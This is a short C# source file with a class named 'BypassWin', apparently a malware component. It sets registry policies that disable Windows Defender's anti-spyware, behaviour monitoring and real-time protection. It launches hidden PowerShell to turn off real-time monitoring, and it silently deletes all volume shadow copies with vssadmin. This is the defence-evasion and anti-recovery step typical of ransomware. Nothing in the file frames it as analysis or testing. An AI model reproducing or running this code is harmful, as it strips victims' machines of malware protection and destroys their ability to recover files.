using System;
using System.Diagnostics;
using Microsoft.Win32;

public static class BypassWin
{
    public static void Start()
    {
        try
        {
            
            RegistryKey defKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender");
            defKey.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
            defKey.Close();

            
            RegistryKey rtKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection");
            rtKey.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
            rtKey.SetValue("DisableOnAccessProtection", 1, RegistryValueKind.DWord);
            rtKey.SetValue("DisableScanOnRealtimeEnable", 1, RegistryValueKind.DWord);
            rtKey.Close();

            
            Process.Start(new ProcessStartInfo
            {
                FileName = "powershell",
                Arguments = "Set-MpPreference -DisableRealtimeMonitoring $true",
                CreateNoWindow = true,
                UseShellExecute = false
            });

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c vssadmin delete shadows /all /quiet",
                CreateNoWindow = true,
                UseShellExecute = false
            });
        }
        catch
        {
            
        }
    }
}
